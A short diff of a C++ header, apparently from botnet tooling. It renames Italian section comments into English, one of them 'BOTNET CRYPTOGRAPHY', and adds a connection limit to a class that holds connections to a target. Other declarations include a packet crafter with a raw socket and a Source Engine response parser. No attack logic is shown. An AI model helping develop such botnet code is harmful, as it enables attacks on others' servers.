@@ -50,7 +50,7 @@ public:
     ServiceInfo parseSourceEngineResponse(const std::string &data);
 };
 
-// ========== CRITTOGRAFIA BOTNET ==========
+// ========== BOTNET CRYPTOGRAPHY ==========
 class CryptoManager {
 private:
     unsigned char key[AES_KEY_SIZE];
@@ -105,6 +105,7 @@ private:
     std::vector<int> connections;
     std::atomic<bool> running;
     std::thread maintainer_thread;
+    int max_connections;
     
     void maintainConnections(const std::string &target, int port);
     
@@ -115,7 +116,7 @@ public:
     void stop();
 };
 
-// ========== CLASSI ESISTENTI ==========
+// ========== EXISTING CLASSES ==========
 class PacketCrafter {
 private:
     int raw_socket;
